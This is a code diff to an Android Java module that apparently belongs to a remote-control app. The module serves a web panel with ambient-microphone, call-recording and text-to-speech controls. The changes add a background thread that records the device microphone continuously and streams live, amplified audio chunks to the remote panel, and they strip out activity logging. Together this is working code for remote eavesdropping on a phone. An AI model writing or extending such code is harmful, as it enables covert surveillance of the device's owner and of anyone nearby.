@@ -329,7 +329,7 @@ public class AcousticsModule extends BaseModule {
         html.append("</div>");
 
         if (isRecording) {
-            html.append("<a href=\"/audio/").append(isRecordingCall ? "call" : "mic").append("/stop\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">&#9724; TERMINATE</a>");
+            html.append("<button onclick=\"stopMicRec()\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); cursor: pointer;\">&#9724; TERMINATE</button>");
         }
         
         html.append("</div></div>");
@@ -349,10 +349,10 @@ public class AcousticsModule extends BaseModule {
             .append("</div>")
 
             .append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px;\">")
-            .append("<a href=\"/audio/mic/start\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-green); color: var(--neon-green);\"").append(">START_REC</a>")
-            .append("<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">30s_BURST</a>")
-            .append("<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">60s_BURST</a>")
-            .append("<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">5m_BURST</a>")
+            .append("<button onclick=\"startMicRec(0)\" class=\"btn btn-small\" ").append(isRecording ? "disabled style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-green); color: var(--neon-green);\"").append(">START_REC</button>")
+            .append("<button onclick=\"startMicRec(30)\" class=\"btn btn-small\" ").append(isRecording ? "disabled style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">30s_BURST</button>")
+            .append("<button onclick=\"startMicRec(60)\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">60s_BURST</button>")
+            .append("<button onclick=\"startMicRec(300)\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">5m_BURST</button>")
             .append("</div></div>");
 
         // --- VOICE EMISSION (TEXT-TO-SPEECH) SECTION (PLACED RIGHT BELOW AMBIENT_MIC) ---
@@ -673,77 +673,126 @@ public class AcousticsModule extends BaseModule {
         return server.serveGzippedProxy(session, "text/html", html.toString());
     }
 
-    private Response serveAudioChunk(IHTTPSession session) {
-        FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Streaming audio chunk...");
-        try {
-            int sampleRate = 16000;
-            int channelConfig = AudioFormat.CHANNEL_IN_MONO;
-            int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
-            int minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioEncoding);
-            int recordBytes = sampleRate * 2; // 1 second of 16kHz 16-bit mono audio (32,000 bytes)
+    private static volatile boolean liveRecordingActive = false;
+    private static final byte[] rollingBuffer = new byte[32000]; // 1 second rolling buffer
+    private static int rollingWritePos = 0;
+    private static long lastChunkReadTime = 0;
+    private static Thread liveRecorderThread = null;
 
+    private synchronized void startLiveAudioEngine() {
+        if (liveRecordingActive && liveRecorderThread != null && liveRecorderThread.isAlive()) {
+            return;
+        }
+        liveRecordingActive = true;
+        lastChunkReadTime = System.currentTimeMillis();
+
+        liveRecorderThread = new Thread(() -> {
+            AudioRecord recorder = null;
+            try {
+                int sampleRate = 16000;
+                int channelConfig = AudioFormat.CHANNEL_IN_MONO;
+                int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
+                int minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioEncoding);
+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    if (context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                        liveRecordingActive = false;
+                        return;
+                    }
+                }
+
+                int[] sources = {
+                    MediaRecorder.AudioSource.MIC,
+                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                    MediaRecorder.AudioSource.VOICE_COMMUNICATION
+                };
+
+                for (int source : sources) {
+                    try {
+                        recorder = new AudioRecord(source, sampleRate, channelConfig, audioEncoding, Math.max(minBufferSize * 2, 8192));
+                        if (recorder.getState() == AudioRecord.STATE_INITIALIZED) {
+                            break;
+                        }
+                    } catch (Exception ignored) {}
+                }
+
+                if (recorder == null || recorder.getState() != AudioRecord.STATE_INITIALIZED) {
+                    liveRecordingActive = false;
+                    return;
+                }
+
+                recorder.startRecording();
+                byte[] tempBuf = new byte[minBufferSize];
+
+                while (liveRecordingActive) {
+                    if (System.currentTimeMillis() - lastChunkReadTime > 8000) {
+                        break;
+                    }
+
+                    int read = recorder.read(tempBuf, 0, tempBuf.length);
+                    if (read > 0) {
+                        synchronized (rollingBuffer) {
+                            for (int i = 0; i < read; i++) {
+                                rollingBuffer[rollingWritePos] = tempBuf[i];
+                                rollingWritePos = (rollingWritePos + 1) % rollingBuffer.length;
+                            }
+                        }
+                    } else {
+                        try { Thread.sleep(20); } catch (Exception ignored) {}
+                    }
+                }
+            } catch (Exception e) {
+                Log.e("AcousticsModule", "Live recorder thread error: " + e.getMessage());
+            } finally {
+                liveRecordingActive = false;
+                try {
+                    if (recorder != null) {
+                        recorder.stop();
+                        recorder.release();
+                    }
+                } catch (Exception ignored) {}
+            }
+        });
+        liveRecorderThread.start();
+    }
+
+    private Response serveAudioChunk(IHTTPSession session) {
+        try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 if (context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                    FirebaseConfig.logActivity("ACOUSTICS_ERROR: MIC permission missing");
                     return server.serveErrorProxy("MIC Permission Missing");
                 }
             }
 
-            AudioRecord recorder = null;
-            int[] sources = {
-                MediaRecorder.AudioSource.MIC,
-                MediaRecorder.AudioSource.VOICE_RECOGNITION,
-                MediaRecorder.AudioSource.VOICE_COMMUNICATION
-            };
-
-            for (int source : sources) {
-                try {
-                    recorder = new AudioRecord(source, sampleRate, channelConfig, audioEncoding, Math.max(minBufferSize * 2, recordBytes));
-                    if (recorder.getState() == AudioRecord.STATE_INITIALIZED) {
-                        break;
-                    }
-                } catch (Exception ignored) {}
+            lastChunkReadTime = System.currentTimeMillis();
+            if (!liveRecordingActive) {
+                startLiveAudioEngine();
+                try { Thread.sleep(300); } catch (Exception ignored) {}
             }
 
-            if (recorder == null || recorder.getState() != AudioRecord.STATE_INITIALIZED) {
-                FirebaseConfig.logActivity("ACOUSTICS_ERROR: All hardware mic sources busy");
-                return server.serveErrorProxy("Hardware Mic Busy");
-            }
-
-            java.io.ByteArrayOutputStream pcmStream = new java.io.ByteArrayOutputStream();
-
-            recorder.startRecording();
-            byte[] buffer = new byte[minBufferSize];
-            int totalRead = 0;
-            long startTime = System.currentTimeMillis();
-
-            while (totalRead < recordBytes && (System.currentTimeMillis() - startTime) < 1300) {
-                int read = recorder.read(buffer, 0, Math.min(buffer.length, recordBytes - totalRead));
-                if (read > 0) {
-                    for (int i = 0; i < read; i += 2) {
-                        if (i + 1 < read) {
-                            short sample = (short) ((buffer[i] & 0xFF) | (buffer[i + 1] << 8));
-                            int boosted = sample * 2;
-                            if (boosted > 32767) boosted = 32767;
-                            else if (boosted < -32768) boosted = -32768;
-                            buffer[i] = (byte) (boosted & 0xFF);
-                            buffer[i + 1] = (byte) ((boosted >> 8) & 0xFF);
-                        }
-                    }
-                    pcmStream.write(buffer, 0, read);
-                    totalRead += read;
-                } else {
-                    break;
+            byte[] pcmSnapshot = new byte[32000];
+            synchronized (rollingBuffer) {
+                int pos = rollingWritePos;
+                int len = rollingBuffer.length;
+                for (int i = 0; i < len; i++) {
+                    pcmSnapshot[i] = rollingBuffer[(pos + i) % len];
                 }
             }
 
-            try { recorder.stop(); } catch (Exception ignored) {}
-            try { recorder.release(); } catch (Exception ignored) {}
+            for (int i = 0; i < pcmSnapshot.length; i += 2) {
+                if (i + 1 < pcmSnapshot.length) {
+                    short sample = (short) ((pcmSnapshot[i] & 0xFF) | (pcmSnapshot[i + 1] << 8));
+                    int boosted = sample * 2;
+                    if (boosted > 32767) boosted = 32767;
+                    else if (boosted < -32768) boosted = -32768;
+                    pcmSnapshot[i] = (byte) (boosted & 0xFF);
+                    pcmSnapshot[i + 1] = (byte) ((boosted >> 8) & 0xFF);
+                }
+            }
 
-            byte[] pcmData = pcmStream.toByteArray();
             java.io.ByteArrayOutputStream wavStream = new java.io.ByteArrayOutputStream();
-            writeWavHeaderWithLength(wavStream, pcmData.length, sampleRate, (short) 1, (short) 16);
-            wavStream.write(pcmData, 0, pcmData.length);
+            writeWavHeaderWithLength(wavStream, pcmSnapshot.length, 16000, (short) 1, (short) 16);
+            wavStream.write(pcmSnapshot, 0, pcmSnapshot.length);
 
             byte[] wavData = wavStream.toByteArray();
             Response res = server.newFixedLengthResponseProxy(Response.Status.OK, "audio/wav", new java.io.ByteArrayInputStream(wavData), wavData.length);
